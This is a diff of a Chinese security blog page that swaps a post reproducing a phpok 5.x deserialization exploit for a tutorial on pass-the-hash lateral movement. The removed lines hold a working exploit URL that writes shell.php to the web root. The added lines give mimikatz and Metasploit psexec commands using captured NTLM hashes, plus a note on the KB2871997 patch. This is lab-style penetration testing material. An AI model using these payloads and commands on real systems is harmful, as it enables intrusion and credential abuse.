@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>phpok5.x 反序列化漏洞 | Sriracha :)</title>
-  <meta name="keywords" content=" 漏洞复现 , 代码审计 ">
-  <meta name="description" content="phpok5.x 反序列化漏洞 | Sriracha :)">
+  <title>Hash传递相关知识点 | Sriracha :)</title>
+  <meta name="keywords" content=" 内网渗透 ">
+  <meta name="description" content="Hash传递相关知识点 | Sriracha :)">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Audit">
@@ -746,9 +746,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-phpok5-x-反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Hash传递相关知识点" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">phpok5.x 反序列化漏洞</h1>
+        <h1 class="article-title">Hash传递相关知识点</h1>
     
     <div class="article-meta">
         
@@ -757,16 +757,14 @@
         
         <span class="tag">
             
-            <a class="color5">漏洞复现</a>
-            
-            <a class="color5">代码审计</a>
+            <a class="color5">内网渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-13 13:02:48'>2019-12-11 18:32</time>
+        创建时间:<time class="date" title='更新时间: 2020-02-03 17:14:01'>2020-02-03 15:09</time>
         
     </div>
     <div class="article-meta">
@@ -788,7 +786,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PTH介绍"><span class="toc-text">PTH介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用mimikatz进行pth"><span class="toc-text">利用mimikatz进行pth</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用msf进行pth"><span class="toc-text">利用msf进行pth</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#KB2871997"><span class="toc-text">KB2871997</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -804,11 +802,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>最近一直想审个命令执行的漏洞，奈何太过于菜没思路，就一直在找分析的文章，吃完饭看见freebuf上发了一篇代码审计的文章，赶紧拉过来看看。<br><a id="more"></a></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><a href="https://download.phpok.com/5.3.zip" target="_blank" rel="noopener">https://download.phpok.com/5.3.zip</a><br>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpok5.3/api.php?c=call&amp;f=index&amp;data=%7B%22m_picplayer%22%3A%7B%22site%22%3A1%2C%22type_id%22%3A%22format_ext_all%22%2C%220%22%3A%7B%22form_type%22%3A%22url%22%2C%22content%22%3A%22O%3A5%3A%5C%22cache%5C%22%3A4%3A%7Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000folder%5C%22%3Bs%3A41%3A%5C%22php%3A%5C%2F%5C%2Ffilter%5C%2Fwrite%3Dstring.rot13%5C%2Fresource%3D%5C%22%3Bs%3A11%3A%5C%22%5Cu0000%2A%5Cu0000key_list%5C%22%3Bs%3A19%3A%5C%22%3C%3Fcuc+cucvasb%28%29%3B+%3F%3E%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000key_id%5C%22%3Bs%3A5%3A%5C%22shell%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000status%5C%22%3Bb%3A1%3B%7D%22%7D%7D%7D</span><br></pre></td></tr></table></figure></p>
-<p><a href="https://download.phpok.com/5.4.zip" target="_blank" rel="noopener">https://download.phpok.com/5.4.zip</a></p>
-<p>可以直接打，真爽，打完之后会在根目录下生成一个shell.php<br><img src="/2019/12/11/phpok5-x-反序列化漏洞/phpok5-x-反序列化漏洞\shell.php" alt></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>lazy…….</p>
+        <h1 id="PTH介绍"><a href="#PTH介绍" class="headerlink" title="PTH介绍"></a>PTH介绍</h1><p>当我们拿到一台服务器的SYSTEM权限之后，利用工具获取到了服务器的HASH值，但是无法抓取到明文密码或者密文解不开，这个时候我们可以尝试进行Pass The Hash(Hash传递)进行横向的渗透攻击</p>
+<h1 id="利用mimikatz进行pth"><a href="#利用mimikatz进行pth" class="headerlink" title="利用mimikatz进行pth"></a>利用mimikatz进行pth</h1><p><img src="/2020/02/03/Hash传递相关知识点/ntlm.png" alt><br>这里的实验机器是windows server 2012 r2(dc)，发现并没有抓取到明文，这个密文设置的密码也解不出来，注意这里的SID为500.</p>
+<p>然后接着在攻击机器上(在域控中的机器)mimikatz中输入如下的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:domainname /ntlm:519c985a849313d2c8029b293b57de1f</span><br></pre></td></tr></table></figure></p>
+<p>效果是这个样子的，然后他会弹出一个新的cmd窗口<br><img src="/2020/02/03/Hash传递相关知识点/mimikatz.png" alt></p>
+<p>这种方式会感觉有些鸡肋，为什么呢，因为弹出新的cmd窗口，你得登上域内的一台3389才能利用这种方式啊，要是登不上域内的远程桌面，命令行下这种方式不行，就像win10的bypass uac一样，不是很喜欢这种弹出新框框的东西 :)</p>
+<h1 id="利用msf进行pth"><a href="#利用msf进行pth" class="headerlink" title="利用msf进行pth"></a>利用msf进行pth</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.15.181</span><br><span class="line">set SMBUser rabbitmask</span><br><span class="line">set SMBPass aad3b435b51404eeaad3b435b51404ee:0515322a55615056aaabb044a48463a4</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/03/Hash传递相关知识点/msf.png" alt><br>不过这里注意一下HASH的值，mimikatz只需要ntlm就能进行传递，msf的这个模块需要LM:NTLM HASH<br>效果是这个样子的，然后他会弹出一个新的cmd窗口<br><img src="/2020/02/03/Hash传递相关知识点/hash.png" alt><br>就是这个样子的</p>
+<h1 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h1><p>微软在2014年5月份发布的这个KB2871997补丁，禁止了本地管理员账户对远程计算机进行了解，所以我们无法使用psexec、wni、smbexec、schtasks、at等命令对远程主机进行操作，也无法使用PTH方法进行横向渗透，但是唯独SID为500的账号可以使用PTH去横向，这个账号去进行PTH不受到该补丁的影响。</p>
+<p>一般在域环境下SID为500的DC就是域控账号了。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 sher10cksec@foxmail.com </span>
@@ -818,12 +820,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>phpok5.x 反序列化漏洞</p>
+    <p><span class="copy-title">文章标题:</span>Hash传递相关知识点</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="sher10ck">sher10ck</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-12-11, 18:32:30</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-13, 13:02:48</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/11/phpok5-x-反序列化漏洞/" title="phpok5.x 反序列化漏洞">http://yoursite.com/2019/12/11/phpok5-x-反序列化漏洞/</a>
+    <p><span class="copy-title">发布时间:</span>2020-02-03, 15:09:28</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-03, 17:14:01</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/02/03/Hash传递相关知识点/" title="Hash传递相关知识点">http://yoursite.com/2020/02/03/Hash传递相关知识点/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
